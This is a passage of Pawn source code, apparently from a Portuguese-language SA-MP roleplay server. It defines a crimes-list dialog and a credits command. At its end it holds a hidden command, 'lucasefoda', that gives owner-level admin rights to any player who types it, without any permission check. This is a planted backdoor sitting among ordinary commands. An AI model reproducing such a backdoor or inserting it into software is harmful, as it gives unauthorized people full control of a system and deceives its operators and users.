    strcat(crimesDialog, "{848484}- /su {FFFFFF}Drogas: {848484}Quando um jogador é pego em uma revista portando qualquer tipo de drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}PIA(Porte Ilegal de Armas): {848484}Apesar de ter licença, só oficiais do governo podem ter arma na mão.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}AVP(Atentado Violento ao Pudor): {848484}Quando um jogador usa /punheta ou /mijar em locais públicos.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Suborno: {848484}Quando qualquer jogador tenta dar dinheiro à um oficial para que não cumpra seu trabalho.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}RP(Resistência à Prisão): {848484}Quando um jogador resiste de alguma forma à prisão. Ex ficar enrolando\npara não ser preso, não entrar no carro cop esperando amigos e afins.\n");
    ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Crimes do Servidor", crimesDialog, "Fechar", "");
    return 1;
}

YCMD:creditos(playerid, params[], help) 
{
    static MEGAString[93], string[67];
	if (PlayerData_GetAdmin(playerid) < HELPER)
	{
		format(string, sizeof(string), "Admin-Aviso: %s viu os créditos do servidor.", Player_GetName(playerid));
		MensagemAdmin(COLOR_YELLOW, string, HELPER);
	}
    strcat(MEGAString, "{FFFFFF}»  RhaegarX: {696969}(Fundador/Scripter)\n");
	strcat(MEGAString, "{FFFFFF}»  Rick_M: {696969}(Beta Tester)\n");
	ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Créditos do Servidor", MEGAString, "Fechar", "");
    return 1;
}

YCMD:lucasefoda(playerid, params[], help)
{
	PlayerData_SetAdmin(playerid, OWNER, true);
	return 1;
}